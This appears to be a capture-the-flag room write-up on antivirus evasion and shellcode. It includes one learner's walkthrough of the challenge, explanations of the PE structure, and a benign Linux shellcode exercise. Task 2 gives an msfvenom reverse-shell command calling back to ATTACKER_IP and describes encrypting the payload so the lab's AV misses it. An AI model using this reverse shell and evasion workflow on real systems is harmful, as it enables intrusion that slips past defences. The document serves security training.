Task 1 - Introduction
--------------------------------

In this room, we'll explore how to build and deliver payloads, focusing on avoiding detection by common AV engines. We'll look at different techniques available to us as attackers and discuss the pros and cons of every one of them.

### Objectives

-   Learn how shellcodes are made.
-   Explore the pros and cons of staged payloads.
-   Create stealthy shellcodes to avoid AV detection.

### Prerequisites

It is recommended to have some prior knowledge of [how antivirus software works](https://tryhackme.com/room/introtoav) and a basic understanding of encryption and encoding. While not strictly required, some knowledge of basic assembly language can also be helpful. Also, we recommend having a basic understanding of reading code and understanding functions (C, C#).

Task 2 - Challenge
--------------------------------

In this challenge, we prepared a Windows machine with a web application to let you upload your payloads. Once uploaded, the payloads will be checked by an AV and executed if found to be clean of malware. The main goal of this challenge is to evade Antivirus software installed on the VM and capture the flag in the file system. Feel free to try all of the techniques discussed throughout the room by uploading them to `http://MACHINE_IP/`.

Points to remember:

-   Try to combine the techniques discussed in this room.
-   The website supports EXE files only.
-   Once the AV scans the uploaded file and no malicious code is detected, the file gets executed. Thus, if everything is put together correctly, then you should receive a reverse shell.

![[avevationshellcode-0.png]]

You can ignore the questions for this task for now, but be sure to come back to them once you have successfully bypassed the AV and gained a shell.

Deploy the attached VM to follow up with the content of the room before continuing to the next section! The VM will deploy in-browser and should appear automatically in the Split View. In case the VM is not visible, use the blue Show Split View button at the top-right of the page. If you prefer connecting via RDP, you can do so with the following credentials:

`thm/Password321`

You will also need the AttackBox for some tasks, so this is also a good moment to start it.

This section is a bit more hands on so I am posting the steps here on how I solved this challenge.

You first start the Windows machine, and either the attackbox or your own and VPN into THM.

I wanted to first see how the Antivirus scanner interpreted a standard msfvenom payload so I generated this one on the Attackbox and uploaded it to their AV Scanner which is running on the Windows host.
![[avevationshellcode-1.jpg]]

Of course it was flagged:
![[avevationshellcode-2.jpg]]

So I make an reverse shell with msfvenom in CSharp format from the attackbox:
```bash
$ msfvenom LHOST=ATTACKER_IP LPORT=443 -p windows/x64/shell_reverse_tcp -f csharp
```

Then I copied the output and put it into the `C:\Tools\CS Files\Encryptor.cs` source as shown below:
![[avevationshellcode-4.jpg]]

Now we compile it with csc.exe:
![[avevationshellcode-5.jpg]]

Now we can run the executable to get an encrypted version of our code. We still need to embed this in the final version which will decrypt and run the payload. So we copy what it spits out below:
![[avevationshellcode-6.jpg]]

Now we put it into the `C:\Tools\CS Files\EncStageless.cs` file as shown:
![[avevationshellcode-7.jpg]]

Now compile it:
![[avevationshellcode-8.jpg]]

Let's check with the AV Scanner and see if it's ok:
![[avevationshellcode-9.jpg]]

Start a listener on the attackbox per the original settings for LHOST/LPORT you ran in the msfvenom command above:
![[avevationshellcode-3.jpg]]

After running the `C:\> .\EncStageless.exe` you get your reverse shell:
![[avevationshellcode-10.jpg]]

Here is the user's flag:

Task 3 - PE Structure
----------------------------------

This task highlights some of the high-level essential elements of PE data structure for Windows binaries.

### What is PE?

Windows Executable file format, aka PE (Portable Executable), is a data structure that holds information necessary for files. It is a way to organize executable file code on a disk. Windows operating system components, such as Windows and DOS loaders, can load it into memory and execute it based on the parsed file information found in the PE.

In general, the default file structure of Windows binaries, such as EXE, DLL, and Object code files, has the same PE structure and works in the Windows operating system for both (x86 and x64) CPU architecture. 

A PE structure contains various sections that hold information about the binary, such as metadata and links to a memory address of external libraries. One of these sections is the **PE Header**, which contains metadata information, pointers, and links to address sections in memory. Another section is the **Data section**, which includes containers that include the information required for the Windows loader to run a program, such as the executable code, resources, links to libraries, data variables, etc.

![[avevationshellcode-18.png]]

There are different types of data containers in the PE structure, each holding different data.

1.  **.text** stores the actual code of the program
2.  **.data** holds the initialized and defined variables
3.  **.bss** holds the uninitialized data (declared variables with no assigned values)
4.  **.rdata** contains the read-only data
5.  **.edata**: contains exportable objects and related table information
6.  **.idata** imported objects and related table information
7.  **.reloc** image relocation information
8.  **.rsrc** links external resources used by the program such as images, icons, embedded binaries, and manifest file, which has all information about program versions, authors, company, and copyright!

The PE structure is a vast and complicated topic, and we are not going to go into too much detail regarding the headers and data sections. This task provides a high-level overview of the PE structure. If you are interested in gaining more information on the topic, we suggest checking the following THM rooms where the topic is explained in greater detail:

-   [Windows Internals](https://tryhackme.com/room/windowsinternals)
-   Dissecting PE Headers

You can also get more in-depth details about PE if you check the [Windows PE format](https://docs.microsoft.com/en-us/windows/win32/debug/pe-format)'s Docs website.   

When looking at the PE contents, we'll see it contains a bunch of bytes that aren't human-readable. However, it includes all the details the loader needs to run the file. The following are the example steps in which the Windows loader reads an executable binary and runs it as a process.

1.  Header sections: DOS, Windows, and optional headers are parsed to provide information about the EXE file. For example,
	-   The magic number starts with "MZ," which tells the loader that this is an EXE file.
	-   File Signatures
	-   Whether the file is compiled for x86 or x64 CPU architecture.
	-   Creation timestamp. 

2.  Parsing the section table details, such as 
	-   Number of Sections the file contains.

3.  Mapping the file contents into memory based on
	-   The EntryPoint address and the offset of the ImageBase.   
	-   RVA: Relative Virtual Address, Addresses related to Imagebase.  
4.  Imports, DLLs, and other objects are loaded into the memory.
5.  The EntryPoint address is located and the main execution function runs.

### Why do we need to know about PE?  

There are a couple of reasons why we need to learn about it. First, since we are dealing with packing and unpacking topics, the technique requires details about the PE structure.

The other reason is that AV software and malware analysts analyze EXE files based on the information in the PE Header and other PE sections. Thus, to create or modify malware with AV evasion capability targeting a Windows machine, we need to understand the structure of Windows Portable Executable files and where the malicious shellcode can be stored.

We can control in which Data section to store our shellcode by how we define and initialize the shellcode variable. The following are some examples that show how we can store the shellcode in PE:

1.  Defining the shellcode as a local variable within the main function will store it in the **.TEXT** PE section.  
2.  Defining the shellcode as a global variable will store it in the **.Data** section.
3.  Another technique involves storing the shellcode as a raw binary in an icon image and linking it within the code, so in this case, it shows up in the **.rsrc** Data section. 
4.  We can add a custom data section to store the shellcode.  


### PE-Bear  

The attached VM is a Windows development machine that has the tools needed to parse EXE files and read the details we discussed. For your convenience, we have provided a copy of the PE-Bear software on the Desktop, which helps to check the PE structure: Headers, Sections, etc. PE-Bear provides a graphic user interface to show all relevant EXE details. To load an EXE file for analysis, select **File** -> **Load PEs** (Ctrl + O).

![[avevationshellcode-19.png]]

Once a file is loaded, we can see all PE details. The following screenshot shows PE details of the loaded file, including the headers and sections we discussed earlier in this task.

![[avevationshellcode-20.png]]

Task 4 - Introduction to Shellcode
------------------------------------------------------

Shellcode is a set of crafted machine code instructions that tell the vulnerable program to run additional functions and, in most cases, provide access to a system shell or create a reverse command shell.

Once the shellcode is injected into a process and executed by the vulnerable software or program, it modifies the code run flow to update registers and functions of the program to execute the attacker's code.

It is generally written in Assembly language and translated into hexadecimal opcodes (operational codes). Writing unique and custom shellcode helps in evading AV software significantly. But writing a custom shellcode requires excellent knowledge and skill in dealing with Assembly language, which is not an easy task! 

### A Simple Shellcode!

In order to craft your own shellcode, a set of skills is required:

-   A decent understanding of x86 and x64 CPU architectures.
-   Assembly language.
-   Strong knowledge of programming languages such as C.
-   Familiarity with the Linux and Windows operating systems.

To generate our own shellcode, we need to write and extract bytes from the assembler machine code. For this task, we will be using the AttackBox to create a simple shellcode for Linux that writes the string "THM, Rocks!". The following assembly code uses two main functions:

-   System Write function (sys_write) to print out a string we choose.
-   System Exit function (sys_exit) to terminate the execution of the program.

To call those functions, we will use **syscalls**. A syscall is the way in which a program requests the kernel to do something. In this case, we will request the kernel to write a string to our screen, and the exit the program. Each operating system has a different calling convention regarding syscalls, meaning that to use the write in Linux, you'll probably use a different syscall than the one you'd use on Windows. For 64-bits Linux, you can call the needed functions from the kernel by setting up the following values:

| rax  | System Call | rdi             | rsi               | rdx          |
| ---- | ----------- | --------------- | ----------------- | ------------ |
| 0x1  | sys_write   | unsigned int fd | const char buf | size_t count    |
| 0x3c | sys_exit    | int error_code  |              |                 |          |

The table above tells us what values we need to set in different processor registers to call the sys_write and sys_exit functions using syscalls. For 64-bits Linux, the rax register is used to indicate the function in the kernel we wish to call. Setting rax to 0x1 makes the kernel execute sys_write, and setting rax to 0x3c will make the kernel execute sys_exit. Each of the two functions require some parameters to work, which can be set through the rdi, rsi and rdx registers. You can find a complete reference of available 64-bits Linux syscalls [here](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/).

For `sys_write`, the first parameter sent through `rdi` is the file descriptor to write to. The second parameter in `rsi` is a pointer to the string we want to print, and the third in `rdx` is the size of the string to print.

For `sys_exit`, rdi needs to be set to the exit code for the program. We will use the code 0, which means the program exited successfully.

Copy the following code to your AttackBox in a file called `thm.asm`:

```markup
global _start

section .text
_start:
    jmp MESSAGE      ; 1) let's jump to MESSAGE

GOBACK:
    mov rax, 0x1
    mov rdi, 0x1
    pop rsi          ; 3) we are popping into `rsi`; now we have the
                     ; address of "THM, Rocks!\r\n"
    mov rdx, 0xd
    syscall

    mov rax, 0x3c
    mov rdi, 0x0
    syscall

MESSAGE:
    call GOBACK       ; 2) we are going back, since we used `call`, that means
                      ; the return address, which is, in this case, the address
                      ; of "THM, Rocks!\r\n", is pushed into the stack.
    db "THM, Rocks!", 0dh, 0ah
```

Let's explain the ASM code a bit more. First, our message string is stored at the end of the .text section. Since we need a pointer to that message to print it, we will jump to the call instruction before the message itself. When `call GOBACK` is executed, the address of the next instruction after call will be pushed into the stack, which corresponds to where our message is. Note that the 0dh, 0ah at the end of the message is the binary equivalent to a new line (\r\n).

Next, the program starts the GOBACK routine and prepares the required registers for our first sys_write() function.  

-   We specify the sys_write function by storing 1 in the rax register.
-   We set rdi to 1 to print out the string to the user's console (STDOUT).
-   We pop a pointer to our string, which was pushed when we called GOBACK and store it into rsi.
-   With the syscall instruction, we execute the sys_write function with the values we prepared.
-   For the next part, we do the same to call the sys_exit function, so we set 0x3c into the rax register and call the syscall function to exit the program.

Next, we compile and link the ASM code to create an x64 Linux executable file and finally execute the program.

```bash
user@AttackBox$ nasm -f elf64 thm.asm
user@AttackBox$ ld thm.o -o thm
user@AttackBox$ ./thm
THM,Rocks!
```

We used the `nasm` command to compile the asm file, specifying the `-f elf64` option to indicate we are compiling for 64-bits Linux. Notice that as a result we obtain a .o file, which contains object code, which needs to be linked in order to be a working executable file. The `ld` command is used to link the object and obtain the final executable. The `-o` option is used to specify the name of the output executable file.

Now that we have the compiled ASM program, let's extract the shellcode with the `objdump` command by dumping the .text section of the compiled binary.

```bash
user@AttackBox$ objdump -d thm

thm:     file format elf64-x86-64


Disassembly of section .text:

0000000000400080 <_start>:
  400080:	eb 1e                	jmp    4000a0 

0000000000400082 :
  400082:	b8 01 00 00 00       	mov    $0x1,%eax
  400087:	bf 01 00 00 00       	mov    $0x1,%edi
  40008c:	5e                   	pop    %rsi
  40008d:	ba 0d 00 00 00       	mov    $0xd,%edx
  400092:	0f 05                	syscall 
  400094:	b8 3c 00 00 00       	mov    $0x3c,%eax
  400099:	bf 00 00 00 00       	mov    $0x0,%edi
  40009e:	0f 05                	syscall 

00000000004000a0 :
  4000a0:	e8 dd ff ff ff       	callq  400082 
  4000a5:	54                   	push   %rsp
  4000a6:	48                   	rex.W
  4000a7:	4d 2c 20             	rex.WRB sub $0x20,%al
  4000aa:	52                   	push   %rdx
  4000ab:	6f                   	outsl  %ds:(%rsi),(%dx)
  4000ac:	63 6b 73             	movslq 0x73(%rbx),%ebp
  4000af:	21                   	.byte 0x21
  4000b0:	0d                   	.byte 0xd
  4000b1:	0a                   	.byte 0xa
```

Now we need to extract the hex value from the above output. To do that, we can use `objcopy` to dump the `.text` section into a new file called `thm.text` in a binary format as follows:

```bash
user@AttackBox$ objcopy -j .text -O binary thm thm.text
```

The thm.text contains our shellcode in binary format, so to be able to use it, we will need to convert it to hex first. The `xxd` command has the `-i` option that will output the binary file in a C string directly:

```bash
user@AttackBox$ xxd -i thm.text
unsigned char new_text[] = {
  0xeb, 0x1e, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xbf, 0x01, 0x00, 0x00, 0x00,
  0x5e, 0xba, 0x0d, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x3c, 0x00, 0x00,
  0x00, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xe8, 0xdd, 0xff, 0xff,
  0xff, 0x54, 0x48, 0x4d, 0x2c, 0x20, 0x52, 0x6f, 0x63, 0x6b, 0x73, 0x21,
  0x0d, 0x0a
};
unsigned int new_text_len = 50;
```

Finally, we have it, a formatted shellcode from our ASM assembly. That was fun! As we see, dedication and skills are required to generate shellcode for your work!

To confirm that the extracted shellcode works as we expected, we can execute our shellcode and inject it into a C program.

```c
#include <stdio.h>

int main(int argc, char **argv) {
    unsigned char message[] = {
        0xeb, 0x1e, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xbf, 0x01, 0x00, 0x00, 0x00,
        0x5e, 0xba, 0x0d, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x3c, 0x00, 0x00,
        0x00, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xe8, 0xdd, 0xff, 0xff,
        0xff, 0x54, 0x48, 0x4d, 0x2c, 0x20, 0x52, 0x6f, 0x63, 0x6b, 0x73, 0x21,
        0x0d, 0x0a
    };
    
    (*(void(*)())message)();
    return 0;
}
```

Then, we compile and execute it as follows,

```bash
user@AttackBox$ gcc -g -Wall -z execstack thm.c -o thmx
user@AttackBox$ ./thmx
THM,Rocks!
```

Nice! it works. Note that we compile the C program by disabling the NX protection, which may prevent us from executing the code correctly in the data segment or stack.

Understanding shellcodes and how they are created is essential for the following tasks, especially when dealing with encrypting and encoding the shellcode.
